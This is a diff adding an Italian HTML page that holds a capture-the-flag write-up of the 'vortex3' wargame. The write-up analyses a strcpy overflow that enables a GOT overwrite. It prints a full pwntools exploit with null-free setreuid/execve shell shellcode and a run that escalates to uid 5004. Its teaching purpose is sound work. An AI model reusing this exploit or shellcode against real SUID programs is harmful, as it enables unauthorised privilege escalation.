@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="https://spaghetti-hacker.github.io/qlnx.png">
+<meta property="og:image:width" content="1024">
+<meta property="og:image:height" content="400">
+<meta property="og:title" content="VORTEX3">
+<meta property="og:description" content=";reversing di un framework di process injection.">
+<meta property="og:type" content="article">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://spaghetti-hacker.github.io/qlnx.png">
+
+
+<title>VORTEX3</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="stylesheet" href="hcf2.css">
+</head>
+<body>
+<div class="wrapper">
+<img src="https://spaghetti-hacker.github.io/qlnx.png" alt="banner" style="width:100%;display:block;">
+<div id="output"></div>
+</div>
+<!--
+================================================================
+SCRIVI QUI IL TUO CONTENUTO
+================================================================
+
+REGOLE:
+  - La prima riga non vuota diventa il titolo della pagina
+    e l'intestazione del box (es. "NO_ELF ~ HCF")
+
+  - @@@...@@@ → blocco codice/assembly (pre-wrap, sfondo scuro)
+
+  - Testo normale → commento (colore muted, paragrafi separati
+    da righe vuote)
+
+  - I link si scrivono normalmente in HTML: <a href="...">testo</a>
+    Il parser li lascia passare nei commenti senza escapare.
+
+  - Tutto il contenuto finisce dentro un unico div.article,
+    esattamente come in no_elf.html.
+
+================================================================
+ESEMPIO:
+
+NO_ELF ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+
+section .METADATI
+
+- tipologia: local privilege escalation, binary exploitation
+- architettura: ELF 32-bit LSB, Intel i386, dynamically linked, interprete /lib/ld-linux.so.2
+- strumenti: gdb, objdump, strace, python3, pwntools, radare2
+- famiglia: wargame didattico, serie vortex
+- variante: vortex3
+- denominazione interna: GOT overwrite via doppia dereferenziazione controllata
+
+_Nota_Metodologica:
+
+;l'analisi e' stata condotta a mano tramite disassemblatori statici (radare2, objdump), debugger interattivo (gdb) e tracing delle syscall (strace). Nessun tool automatico di exploit generation e' stato impiegato. Il payload finale e' stato costruito manualmente. L'intelligenza artificiale e' stata utilizzata esclusivamente nella fase finale del lavoro, come supporto all'analisi: per validare alcune ipotesi interpretative, per effettuare una revisione degli errori sul materiale gia' analizzato e in parte per la stesura del presente write-up.
+
+section .EXECUTIVE_SUMMARY
+
+;il binario vortex3 e' un eseguibile SUID appartenente a vortex4, eseguibile dal gruppo vortex3. Contiene una funzione main vulnerabile a buffer overflow su strcpy, ma il vettore di sfruttamento reale non e' l'overflow classico dell'indirizzo di ritorno: e' la scrittura, tramite un puntatore a puntatore globale, di un valore arbitrario controllato dall'attaccante. Questo consente una primitiva write-what-where che viene puntata sulla GOT della funzione exit. La conseguenza e' l'esecuzione di shellcode al posto della chiamata di libreria exit(), con conseguente escalation a UID 5004.
+
+
+section .CODICE_SORGENTE
+
+;codice della CTF: vortex3.c
+
+@@@
+/*
+ * 0xbadc0ded.org Challenge #02 (2003-07-08)
+ *
+ * Joel Eriksson <je@0xbadc0ded.org>
+ */
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+unsigned long val = 31337;
+unsigned long *lp = &val;
+
+int main(int argc, char **argv)
+{
+        unsigned long **lpp = &lp, *tmp;
+        char buf[128];
+
+        if (argc != 2)
+                exit(1);
+
+        strcpy(buf, argv[1]);
+
+        if (((unsigned long) lpp & 0xffff0000) != 0x08040000)
+                exit(2);
+
+        tmp = *lpp;
+        **lpp = (unsigned long) &buf;
+        // *lpp = tmp; // Fix suggested by Michael Weissbacher @mweissbacher 2013-06-30
+
+        exit(0);
+}
+@@@
+
+section .ARCHITETTURA_GENERALE
+
+@@@
+main()
+|
++-- strcpy(buf, argv[1]) ; overflow del buffer locale, nessun controllo di lunghezza
+|
++-- controllo su lpp & 0xffff0000 ; vincolo di indirizzo, non protezione reale
+|
++-- tmp = *lpp
+|
++-- **lpp = &buf ; doppia dereferenziazione, primitiva di scrittura
+|
++-- exit(0)
+|
++-- jmp [exit@GOT] ; lazy binding, salto indiretto
+|
++-- &buf ; shellcode eseguito al posto di exit reale
+@@@
+
+section .PROTEZIONI_BINARIE
+
+_Checksec_E_Assenza_Di_Mitigazioni:
+
+@@@
+checksec --file=/vortex/vortex3
+
+RELRO: No RELRO
+Stack: No canary found
+NX: NX disabled
+PIE: No PIE (0x8048000)
+@@@
+
+;No RELRO significa che la GOT resta scrivibile per l'intera esecuzione del processo, non solo prima della prima chiamata a ogni funzione. Questo e' condizione necessaria per l'overwrite: con Full RELRO la GOT verrebbe risolta interamente al caricamento e resa read-only, rendendo impossibile la scrittura su exit@GOT.
+
+;No canary found significa che l'overflow lineare in strcpy non incontra alcun valore di controllo tra buf e lpp. Con uno stack canary attivo il programma abortirebbe prima di raggiungere e sovrascrivere lpp, rendendo la variabile irraggiungibile.
+
+;NX disabled indica che lo stack e' eseguibile, ma questo dettaglio e' irrilevante per l'exploit: lo shellcode non viene mai eseguito direttamente dallo stack tramite salto diretto, bensi' tramite l'overwrite di exit@GOT che punta a &buf. Anche con NX abilitato l'exploit funzionerebbe, perche' il meccanismo di innesco e' un jmp calcolato dalla GOT, non una tecnica di stack-smashing classica con ret-to-stack.
+
+;No PIE, indirizzo base 0x8048000, e' la condizione che rende deterministico ogni indirizzo usato nell'exploit. exit@plt+2 (0x08049052) ed exit@GOT (0x0804b200) sono costanti a ogni esecuzione, perche' il binario viene sempre mappato allo stesso indirizzo base. Con PIE abilitato questi indirizzi cambierebbero a ogni run e l'exploit richiederebbe un leak preventivo.
+
+L'assenza combinata di RELRO, canary e PIE trasforma un bug logico nel codice sorgente in una primitiva di exploitation completamente affidabile e ripetibile, senza bisogno di bruteforce o information leak.
+
+section .VETTORI_DI_ATTACCO
+
+_Buffer_Overflow_Su_strcpy:
+
+@@@
+unsigned long **lpp = &lp, *tmp;
+char buf[128];
+strcpy(buf, argv[1]);
+@@@
+
+;strcpy non verifica la lunghezza della stringa sorgente. argv[1] e' completamente controllato dall'attaccante. buf ha dimensione fissa 128 byte, ma lo stack frame consente overwrite oltre il buffer. l'overflow non serve a corrompere l'indirizzo di ritorno. Serve a sovrascrivere la variabile lpp, che risiede subito dopo buf nello stack frame, con un valore scelto dall'attaccante.
+
+_write-what-where_Tramite_Doppia_Dereferenziazione:
+
+@@@
+tmp = *lpp;
+**lpp = (unsigned long) &buf;
+@@@
+
+;lpp punta normalmente a lp, che punta a val. Se lpp viene sovrascritto con un indirizzo arbitrario X, il programma scrive &buf in *X. Questo trasforma un semplice puntatore globale in una primitiva write-what-where. Il controllo (lpp & 0xffff0000) == 0x08040000 limita l'indirizzo scelto alla pagina di memoria del binario stesso, non impedisce la scrittura arbitraria all'interno di quella pagina.
+
+_Overwrite_Della_GOT:
+
+@@@
+objdump -R /vortex/vortex3
+
+0804b1fc R_386_JUMP_SLOT strcpy@GLIBC_2.0
+0804b200 R_386_JUMP_SLOT exit@GLIBC_2.0
+@@@
+
+;exit@GOT si trova all'indirizzo 0x0804b200. È una entry JUMP_SLOT, quindi soggetta a lazy binding. sovrascriverla con l'indirizzo di buf reindirizza l'esecuzione di exit() verso lo shellcode. il target scelto per la scrittura arbitraria non e' direttamente exit@GOT, ma exit@plt+2, per ragioni spiegate nella sezione successiva.
+
+_Bypass_Del_Filtro_NULL_Byte:
+
+@@@
+./vortex3 $(python3 -c '...')
+-bash: warning: command substitution: ignored null byte in input
+@@@
+
+;argv e' una stringa C, terminata da 0x00. strcpy si ferma al primo byte nullo incontrato. Qualsiasi indirizzo o istruzione contenente 0x00 tronca il payload prima del target. Questo vincolo obbliga sia l'indirizzo lpp sia lo shellcode a essere privi di byte nulli, condizionando la scelta del target GOT e la scrittura delle istruzioni assembly.
+
+_Bypass_Privilegi_Tramite_setreuid:
+
+@@@
+strace -f -e trace=setuid,setreuid,setresuid /vortex/vortex3 ...
+setuid(5004) = -1 EPERM
+@@@
+
+;il processo ha RUID pari all'utente chiamante, EUID e SUID entrambi 5004 per effetto del bit SUID. setuid confronta il valore richiesto con RUID e SUID del processo, non con l'EUID corrente. Poiche' il binario e' SUID, all'exec la SUID viene impostata a 5004 come l'EUID, quindi in teoria setuid(5004) dovrebbe avere successo; l'EPERM osservato indica una causa non isolata con precisione (possibile discrepanza nel registro ebx al momento della syscall), non un limite strutturale della setuid stessa. Si e' quindi optato per setreuid, che imposta esplicitamente sia RUID sia EUID senza dipendere da questa ambiguita'.
+
+@@@
+xor eax, eax
+mov al, 0x46
+xor ebx, ebx
+mov bx, 0x138c
+xor ecx, ecx
+mov cx, 0x138c
+int 0x80
+@@@
+
+;syscall 0x46 = setreuid, imposta sia RUID sia EUID. 0x138c = 5004 decimale, l'UID target del binario SUID. ebx = nuovo RUID, ecx = nuovo EUID, entrambi 5004. xor + mov parziale evita byte nulli nell'immediato, a differenza di un mov eax, 5004 diretto.
+
+;setreuid(ruid, euid) è più esplicita: permette di specificare direttamente sia il nuovo RUID sia il nuovo EUID in un colpo solo, e non dipende dall'ambiguità di "quale singolo parametro passare a setuid". Impostando entrambi a 5004 esplicitamente, il risultato è deterministico indipendentemente da eventuali dettagli sottili nella logica di controllo di setuid da sola.
+
+section .ASPETTI_TECNICI_RILEVANTI
+
+_Relazione_Tra_exit@plt_exit@GOT:
+
+@@@
+0x08049050 exit@plt: jmp DWORD PTR ds:0x0804b200
+
+ff 25 00 b2 04 08
+@@@
+
+;ff 25 e' l'opcode di jmp indiretto tramite indirizzo assoluto a 32 bit. I 4 byte successivi (00 b2 04 08) sono l'indirizzo della GOT in little-endian, cioe' 0x0804b200. L'indirizzo della GOT e' quindi codificato a partire dal terzo byte dell'istruzione, cioe' exit@plt+2. Da qui la scelta di 0x08049052 come target di lpp: quell'indirizzo, letto come dato, contiene il valore 0x0804b200, cioe' l'indirizzo reale della GOT di exit.
+
+_Lazy_Binding_E_Catena_Di_Dereferenziazione:
+
+@@@
+lpp = 0x08049052 ; indirizzo scelto, punta dentro l'istruzione jmp di exit@plt.
+*lpp = 0x0804b200 ; valore letto in quell'indirizzo, e' l'indirizzo della GOT.
+**lpp = *(0x0804b200) ; valore correntemente presente in GOT, prima dell'overwrite e' l'indirizzo di libc.
+@@@
+
+;il lazy binding normalmente risolve l'indirizzo reale di exit al primo utilizzo e lo scrive in GOT. Qui la doppia dereferenziazione del programma viene dirottata per scrivere &buf esattamente in quella cella. Dopo l'overwrite, GOT[exit] non contiene piu' l'indirizzo di libc ma l'indirizzo del buffer sullo stack. Questo e' il punto centrale dell'exploit: il programma stesso esegue **lpp = &buf, e la scelta di lpp fa si' che quella scrittura coincida esattamente con GOT[exit].
+
+_Calcolo_Dell'_Offset_E_Struttura_Del_Payload:
+
+@@@
+payload = shellcode + b"A" * (132 - len(shellcode)) + p32(0x08049052)
+@@@
+
+;offset 132 determinato empiricamente con debugging, non calcolato a priori dalla sola dimensione di buf (128 byte). La differenza di 4 byte e' dovuta al layout dello stack frame, dove lpp risiede subito dopo buf con eventuale allineamento. L'ultimo p32 sovrascrive lpp con l'indirizzo 0x08049052, cioe' exit@plt+2. Il payload totale misura 136 byte: 43 di shellcode, 89 di padding, 4 dell'indirizzo target.
+
+section .ANALISI_DEL_FIX_COMMENTATO
+
+_Perche'_Il_Fix_Suggerito_Non_Risolve_Il_Problema:
+
+@@@
+tmp = *lpp;
+**lpp = (unsigned long) &buf;
+// *lpp = tmp;
+@@@
+
+;tmp viene assegnato prima della scrittura arbitraria e contiene il valore letto in *lpp, cioe' il contenuto della cella puntata da lpp al momento dell'esecuzione. Nel caso dell'exploit, lpp punta a exit@plt+2 (0x08049052), quindi tmp contiene 0x0804b200, l'indirizzo della GOT di exit.
+
+;La scrittura pericolosa avviene sulla riga precedente, tramite **lpp, non tramite *lpp. **lpp scrive &buf all'indirizzo contenuto in *lpp, cioe' in 0x0804b200, la cella GOT stessa. E' questa la cella corrotta, non la cella puntata direttamente da lpp.
+
+;Il fix commentato *lpp = tmp riscriverebbe 0x0804b200 nell'indirizzo 0x08049052, cioe' esattamente il valore che vi si trovava gia' prima di qualsiasi operazione. Quella cella (exit@plt+2, l'istruzione jmp) non viene mai alterata dall'exploit, quindi il fix agisce su un dato che non e' mai stato corrotto.
+
+;La cella realmente compromessa, 0x0804b200, non viene mai toccata dal fix. Il valore malevolo &buf resta scritto in GOT anche dopo l'esecuzione di *lpp = tmp, perche' quella riga non ha alcuna relazione con l'indirizzo GOT, ma solo con l'indirizzo di lpp stesso.
+
+Il fix commentato nasce probabilmente da un modello mentale in cui tmp salva il valore originale della locazione che sta per essere corrotta, utile a ripristinarla dopo l'uso. Questo modello e' corretto per una singola dereferenziazione, ma non regge in presenza di una doppia dereferenziazione: tmp salva il dato che punta al bersaglio reale, non il dato che si trova nel bersaglio reale. Per neutralizzare l'exploit servirebbe invece salvare e ripristinare il valore originale di **lpp, non di *lpp, oppure eliminare a monte la possibilita' di controllare lpp tramite il controllo sull'overflow di buf.
+
+section .EXPLOIT
+
+@@@
+#!/usr/bin/env python3
+from pwn import *
+
+context.arch = "i386"
+context.os = "linux"
+
+BINARY = "/vortex/vortex3"
+
+LEVEL4_UID = 5004       # <-- UID corretto del livello 4
+OFFSET = 132
+LPP = 0x08049052
+
+shellcode = asm("""
+    xor eax, eax
+    mov al, 0x46
+
+    xor ebx, ebx
+    mov bx, 0x138c
+
+    xor ecx, ecx
+    mov cx, 0x138c
+
+    int 0x80
+
+    xor eax, eax
+    mov al, 0xb
+    xor edx, edx
+    push edx
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push edx
+    push ebx
+    mov ecx, esp
+    int 0x80
+""")
+
+log.info(f"shellcode length: {len(shellcode)}")
+log.info(f"shellcode: {shellcode.hex()}")
+
+assert len(shellcode) <= OFFSET
+assert b"\x00" not in shellcode
+
+payload = (
+    shellcode +
+    b"A" * (OFFSET - len(shellcode)) +
+    p32(LPP)
+)
+
+log.info(f"payload length: {len(payload)}")
+log.info(f"LPP: {hex(LPP)}")
+
+io = process([BINARY, payload])
+io.interactive()
+
+vortex3@vortex:~$ python3 /tmp/bz.py
+[*] shellcode length: 43
+[*] shellcode: 31c0b04631db66bb8c1331c966b98c13cd8031c0b00b31d252682f2f7368682f62696e89e3525389e1cd80
+[*] payload length: 136
+[*] LPP: 0x8049052
+[+] Starting local process '/vortex/vortex3': pid 111
+[*] Switching to interactive mode
+$ id
+uid=5004(vortex4) gid=5003(vortex3) groups=5003(vortex3)
+@@@
+
+section .NOTE_FINALI
+
+L'aspetto didattico principale di vortex3 non e' il buffer overflow in se', ma il fatto che il programma offra gia' una primitiva write-what-where tramite **lpp = &buf. Il lavoro dell'attaccante si riduce a scegliere correttamente il valore di lpp, sfruttando la conoscenza della codifica dell'istruzione jmp in exit@plt per individuare una cella di memoria che, letta come dato, contiene l'indirizzo della GOT. Il vincolo sui NULL byte nell'input, imposto da strcpy su una stringa C, ha condizionato sia la scelta dell'indirizzo target sia la scrittura dello shellcode, obbligando l'uso di setreuid al posto di setuid per completare correttamente la transizione di privilegio.
+
+<a href="https://spaghetti-hacker.github.io/">index.html</a>
+</script>
+<script>
+(function(){
+    const raw = document.getElementById('content').textContent;
+    const lines = raw.split('\n');
+    const output = document.getElementById('output');
+
+    let i = 0;
+
+    // salta righe vuote iniziali
+    while(i < lines.length && lines[i].trim() === '') i++;
+
+    // prima riga non vuota = titolo
+    const title = lines[i] ? lines[i].trim() : '';
+    if(title){
+        document.title = title;
+    }
+    i++;
+
+    // costruisce il contenuto dentro un unico div.article
+    // il titolo è il nodo di testo iniziale del box
+    let inner = escCode(title);
+    i; // già avanzato
+
+    while(i < lines.length){
+        const line = lines[i];
+
+        // blocco @@@ → codice pre-wrap
+        if(line.trim() === '@@@'){
+            i++;
+            let block = '';
+            while(i < lines.length && lines[i].trim() !== '@@@'){
+                block += lines[i] + '\n';
+                i++;
+            }
+            i++; // salta @@@ di chiusura
+            // il codice viene escapato tranne &lt; &gt; &amp; già scritti
+            //inner += escCode(block.replace(/\n$/, ''));
+	    inner += '<pre class="codeblock">' + escCode(block.replace(/\n$/, '')) + '</pre>';
+            continue;
+        }
+
+        // raccoglie testo fino al prossimo @@@
+        let textLines = [];
+        while(i < lines.length && lines[i].trim() !== '@@@'){
+            textLines.push(lines[i]);
+            i++;
+        }
+
+        const paragraphs = splitParagraphs(textLines);
+        if(paragraphs.length > 0){
+	    inner += '<div class="commento">\n';
+            for (const p of paragraphs){
+                if(p.type === 'title'){
+                    inner += '<p class="title">' + p.text + '</p>\n';
+                } else {
+                    const cleaned = p.text.replace(/\n/g, '<br>');
+                    inner += '<p>' + cleaned + '</p>\n';
+                }
+                }
+            inner += '</div>';
+        }
+    }
+
+    output.innerHTML = '<div class="article">' + inner + '</div>';
+
+    // escapa solo il testo codice (non i commenti che possono avere HTML)
+    function escCode(str){
+        return str
+            .replace(/&(?!(?:amp|lt|gt|quot|#\d+);)/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    }
+
+    function splitParagraphs(lines){
+        const result = [];
+        let current = [];
+
+        function flush(){
+            if(current.length > 0){
+                result.push({ type: 'text', text: current.join('\n') });
+                current = [];
+            }
+        }
+
+        for(const line of lines){
+            const trimmed = line.trim();
+            if(trimmed === ''){
+                flush();
+            } else if(/^(section|_)/.test(trimmed)){
+                // riga "title": es. "section .CONCLUSIONI" o "_Natura_della_Vulnerabilita:"
+                flush();
+                result.push({ type: 'title', text: trimmed });
+            } else {
+                current.push(line);
+            }
+        }
+        flush();
+        return result;
+    }
+})();
+</script>
+<script>
+fetch("https://api.counterapi.dev/v1/:spaghettihacker/:qlnx/up")
+  .then(res => res.json())
+  .then(data => {
+    const counter = data.count;
+
+    document.getElementById("visits").innerText =
+      counter !== undefined ? counter : "error";
+  })
+  .catch(() => {
+    document.getElementById("visits").innerText = "error";
+  });
+</script>
+</body>
+</html>
